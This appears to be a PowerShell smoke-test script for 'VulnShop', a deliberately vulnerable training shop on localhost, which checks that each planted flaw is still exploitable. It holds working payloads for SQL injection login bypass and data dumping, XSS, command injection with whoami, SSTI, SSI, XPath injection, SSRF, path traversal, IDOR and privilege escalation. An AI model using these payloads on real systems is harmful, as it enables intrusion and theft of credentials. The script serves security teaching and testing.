# ============================================================================
#  VulnShop - Suite de SMOKE TEST (reverificacao de todas as falhas principais)
#  Requer o BACKEND rodando (http://localhost:4000) e o MariaDB de pe.
#  Uso:  powershell -ExecutionPolicy Bypass -File testes\smoke.ps1
#  Reseta o banco no inicio (schema + seed) para resultados deterministicos.
# ============================================================================
$ErrorActionPreference = 'Continue'
$H = @{ 'Content-Type' = 'application/json' }
$MYSQL = 'C:\Program Files\MariaDB 12.3\bin\mysql.exe'
$RAIZ = Split-Path $PSScriptRoot -Parent
$script:pass = 0; $script:fail = 0

function Verificar($nome, $cond) {
  if ($cond) { Write-Host ("  [OK]   " + $nome) -ForegroundColor Green; $script:pass++ }
  else { Write-Host ("  [FALHA] " + $nome) -ForegroundColor Red; $script:fail++ }
}
function Sessao($nivel) {
  $s = New-Object Microsoft.PowerShell.Commands.WebRequestSession
  Invoke-RestMethod http://localhost:4000/api/nivel -Method Post -WebSession $s -Headers $H -Body (@{nivel = $nivel } | ConvertTo-Json) | Out-Null
  return $s
}
function Login($s, $u, $p) {
  return Invoke-RestMethod http://localhost:4000/api/auth/login -Method Post -WebSession $s -Headers $H -Body (@{usuario = $u; senha = $p } | ConvertTo-Json)
}

Write-Host "Resetando o banco..." -ForegroundColor Cyan
& $MYSQL -u root -proot -e "SOURCE $($RAIZ -replace '\\','/')/db/schema.sql" 2>$null
& $MYSQL -u root -proot -e "SOURCE $($RAIZ -replace '\\','/')/db/seed.sql" 2>$null

Write-Host "`n== Reconhecimento / Config =="
try { $health = Invoke-RestMethod http://localhost:4000/api/health } catch { Write-Host "BACKEND OFF"; exit 1 }
Verificar "Health: banco conectado" ($health.banco -eq 'conectado')
$hdr = Invoke-WebRequest http://localhost:4000/api/health -UseBasicParsing
Verificar "INFO-02 X-Powered-By exposto" ($hdr.Headers['X-Powered-By'] -match 'Express')
$rb = (Invoke-WebRequest http://localhost:4000/robots.txt -UseBasicParsing).Content
Verificar "INFO-03 robots.txt lista /admin" ($rb -match '/admin')
$bak = Invoke-WebRequest http://localhost:4000/config.js.bak -UseBasicParsing
$baktxt = if ($bak.Content -is [byte[]]) { [Text.Encoding]::UTF8.GetString($bak.Content) } else { [string]$bak.Content }
Verificar "CONF-04 config.js.bak vaza jwtSecret" ($baktxt -match 'jwtSecret')

Write-Host "`n== Autenticacao / Sessao =="
try { $r = Invoke-RestMethod http://localhost:4000/api/auth/login -Method Post -Headers $H -Body (@{usuario = "admin' -- "; senha = 'x' } | ConvertTo-Json); $sqli = $r.usuario.papel -eq 'admin' } catch { $sqli = $false }
Verificar "INPV-05 SQLi login (admin' -- )" $sqli
try { $r = Invoke-RestMethod http://localhost:4000/api/auth/login -Method Post -Headers $H -Body (@{usuario = 'admin'; senha = 'admin' } | ConvertTo-Json); $def = $r.usuario.papel -eq 'admin' } catch { $def = $false }
Verificar "ATHN-02 credenciais padrao admin/admin" $def
$e1 = $null; try { Invoke-RestMethod http://localhost:4000/api/auth/login -Method Post -Headers $H -Body (@{usuario = 'naoexiste'; senha = 'x' } | ConvertTo-Json) } catch { $e1 = $_.ErrorDetails.Message }
$e2 = $null; try { Invoke-RestMethod http://localhost:4000/api/auth/login -Method Post -Headers $H -Body (@{usuario = 'admin'; senha = 'errada' } | ConvertTo-Json) } catch { $e2 = $_.ErrorDetails.Message }
Verificar "IDNT-04 enumeracao (mensagens diferentes)" ($e1 -ne $e2)

Write-Host "`n== Input Validation =="
$q = [uri]::EscapeDataString("x%' UNION SELECT id,usuario,senha,papel,email,1,1,NOW() FROM usuarios -- ")
$b = Invoke-RestMethod "http://localhost:4000/api/produtos/busca?q=$q"
Verificar "INPV-05 SQLi busca UNION (dump usuarios)" ($b.resultados.descricao -contains 'admin')
$bx = Invoke-RestMethod "http://localhost:4000/api/produtos/busca?q=$([uri]::EscapeDataString('<img src=x onerror=alert(1)>'))"
Verificar "INPV-01 XSS refletido (termo devolvido cru)" ($bx.termo -match 'onerror')
Invoke-RestMethod http://localhost:4000/api/avaliacoes/2 -Method Post -Headers $H -Body (@{autor = 'atk'; nota = 5; comentario = '<img src=x onerror=alert(1)>' } | ConvertTo-Json) | Out-Null
$avs = Invoke-RestMethod http://localhost:4000/api/avaliacoes/2
Verificar "INPV-02 XSS armazenado (comentario cru)" ((@($avs | Where-Object { $_.comentario -match 'onerror' })).Count -ge 1)
$ping = Invoke-RestMethod http://localhost:4000/api/admin/ping -Method Post -Headers $H -Body (@{host = '127.0.0.1 & whoami' } | ConvertTo-Json)
Verificar "INPV-12 command injection (& whoami)" ($ping.saida -match '\\')
$calc = Invoke-RestMethod http://localhost:4000/api/admin/calcular -Method Post -Headers $H -Body (@{expr = '6*7' } | ConvertTo-Json)
Verificar "INPV-11 code injection (eval 6*7=42)" ($calc.resultado -eq 42)
$ssti = Invoke-RestMethod http://localhost:4000/api/util/template -Method Post -Headers $H -Body (@{template = '<%= 7*7 %>' } | ConvertTo-Json)
Verificar "INPV-18 SSTI (7*7=49)" ($ssti.render -match '49')
$ssrf = Invoke-RestMethod http://localhost:4000/api/contato -Method Post -Headers $H -Body (@{nome = 'x'; mensagem = 'y'; url_preview = 'http://localhost:4000/config.js.bak' } | ConvertTo-Json)
Verificar "INPV-19 SSRF (busca interna)" ($ssrf.preview.trecho -match 'jwtSecret')
$ssi = Invoke-RestMethod http://localhost:4000/api/injecoes/ssi -Method Post -Headers $H -Body (@{texto = '<!--#exec cmd="whoami"-->' } | ConvertTo-Json)
Verificar "INPV-08 SSI (exec whoami)" ($ssi.render -match '\\')
$xp = Invoke-RestMethod http://localhost:4000/api/injecoes/xpath -Method Post -Headers $H -Body (@{usuario = 'admin'; senha = "' or '1'='1" } | ConvertTo-Json)
Verificar "INPV-09 XPath injection (papel admin)" ($xp.autenticado -and $xp.papel -eq 'admin')

Write-Host "`n== Autorizacao =="
$sb = Sessao 'low'; Login $sb 'bob' 'bob123' | Out-Null
$idor = Invoke-RestMethod http://localhost:4000/api/pedidos/1 -WebSession $sb
Verificar "ATHZ-04 IDOR (bob ve pedido de usuario_id=2)" ($idor.usuario_id -eq 2)
$trav = Invoke-WebRequest "http://localhost:4000/api/arquivos/comprovante?file=C:/Windows/win.ini" -UseBasicParsing
Verificar "ATHZ-01 path traversal (win.ini)" ($trav.Content -match '\[')
$sa = Sessao 'low'; Login $sa 'alice' 'alice123' | Out-Null
Invoke-RestMethod http://localhost:4000/api/perfil -Method Post -WebSession $sa -Headers $H -Body (@{papel = 'admin' } | ConvertTo-Json) | Out-Null
Verificar "ATHZ-03 priv-esc Low (papel=admin)" ((Invoke-RestMethod http://localhost:4000/api/auth/eu -WebSession $sa).usuario.papel -eq 'admin')
& $MYSQL -u root -proot -e "USE vulnshop; UPDATE usuarios SET papel='cliente' WHERE usuario='alice';" 2>$null
$sm = Sessao 'medium'; Login $sm 'alice' 'alice123' | Out-Null
Invoke-RestMethod http://localhost:4000/api/perfil -Method Post -WebSession $sm -Headers $H -Body '{"Papel":"admin"}' | Out-Null
Verificar "ATHZ-03 priv-esc Medium bypass (Papel)" ((Invoke-RestMethod http://localhost:4000/api/auth/eu -WebSession $sm).usuario.papel -eq 'admin')
& $MYSQL -u root -proot -e "USE vulnshop; UPDATE usuarios SET papel='cliente' WHERE usuario='alice';" 2>$null

Write-Host "`n== Verb Tampering / CSRF / Business Logic =="
$sm2 = Sessao 'medium'
$vbBlock = $false; try { Invoke-RestMethod http://localhost:4000/api/verbo/promover/2 -Method Post -WebSession $sm2 -Headers $H | Out-Null } catch { $vbBlock = $true }
$vbPut = Invoke-RestMethod http://localhost:4000/api/verbo/promover/2 -Method Put -WebSession $sm2 -Headers $H
Verificar "INPV-03 verb tampering (POST bloqueia, PUT fura)" ($vbBlock -and $vbPut.ok)
& $MYSQL -u root -proot -e "USE vulnshop; UPDATE usuarios SET papel='cliente' WHERE id=2;" 2>$null
$sh = Sessao 'high'; $lg = Login $sh 'alice' 'alice123'
$csrfBlock = $false; try { Invoke-RestMethod http://localhost:4000/api/perfil -Method Post -WebSession $sh -Headers $H -Body (@{nome = 'X' } | ConvertTo-Json) | Out-Null } catch { $csrfBlock = $true }
$csrfOk = Invoke-RestMethod http://localhost:4000/api/perfil -Method Post -WebSession $sh -Headers (@{'Content-Type' = 'application/json'; 'X-CSRF-Token' = $lg.csrf }) -Body (@{nome = 'Alice Souza' } | ConvertTo-Json)
Verificar "SESS-05 CSRF High (sem token 403, com token ok)" ($csrfBlock -and $csrfOk.ok)
$c1 = Invoke-RestMethod http://localhost:4000/api/checkout -Method Post -Headers $H -Body (@{itens = @(@{produto_id = 1; nome = 'x'; preco = 100; quantidade = 1 }); cupom = 'PROMO50' } | ConvertTo-Json -Depth 5)
$c2 = Invoke-RestMethod http://localhost:4000/api/checkout -Method Post -Headers $H -Body (@{itens = @(@{produto_id = 1; nome = 'x'; preco = 100; quantidade = 1 }); cupom = 'PROMO50' } | ConvertTo-Json -Depth 5)
Verificar "BUSL-05 reuso de cupom (2x 50%)" (($c1.total -eq 50) -and ($c2.total -eq 50))
$neg = Invoke-RestMethod http://localhost:4000/api/checkout -Method Post -Headers $H -Body (@{itens = @(@{produto_id = 1; nome = 'x'; preco = 100; quantidade = -3 }) } | ConvertTo-Json -Depth 5)
Verificar "BUSL-01 quantidade negativa (total < 0)" ($neg.total -lt 0)

Write-Host "`n== Client-side / API / Config =="
$cors = Invoke-WebRequest http://localhost:4000/api/produtos -Headers @{Origin = 'http://evil.com' } -UseBasicParsing
Verificar "CLNT-07 CORS reflete Origin + credenciais" (($cors.Headers['Access-Control-Allow-Origin'] -eq 'http://evil.com') -and ($cors.Headers['Access-Control-Allow-Credentials'] -eq 'true'))
$traceOk = $false; try { $tr = Invoke-WebRequest http://localhost:4000/api/health -Method Trace -UseBasicParsing; $traceOk = ($tr.StatusCode -eq 200) } catch {}
Verificar "CONF-06 TRACE habilitado" $traceOk
$gql = Invoke-RestMethod http://localhost:4000/graphql -Method Post -Headers $H -Body (@{query = '{ usuarios { usuario senha papel } }' } | ConvertTo-Json)
Verificar "APIT-01 GraphQL sem auth (vaza senha)" ($gql.data.usuarios.senha -contains 'admin')
$reqR = [System.Net.HttpWebRequest]::Create("http://localhost:4000/api/util/redirect?url=https://example.com/")
$reqR.AllowAutoRedirect = $false
$loc = $null; try { $respR = $reqR.GetResponse(); $loc = $respR.Headers['Location']; $respR.Close() } catch { $loc = $_.Exception.Response.Headers['Location'] }
Verificar "CLNT-04 open redirect (302 externo)" ($loc -match 'example.com')

# limpeza final
& $MYSQL -u root -proot -e "USE vulnshop; UPDATE usuarios SET papel='cliente' WHERE usuario IN ('alice','bob'); DELETE FROM avaliacoes WHERE autor='atk'; UPDATE cupons SET usos=0;" 2>$null

Write-Host "`n=====================================================" -ForegroundColor Cyan
$cor = if ($script:fail -eq 0) { 'Green' } else { 'Yellow' }
Write-Host (" RESULTADO:  $script:pass OK  /  $script:fail FALHA(S)") -ForegroundColor $cor
Write-Host "=====================================================" -ForegroundColor Cyan
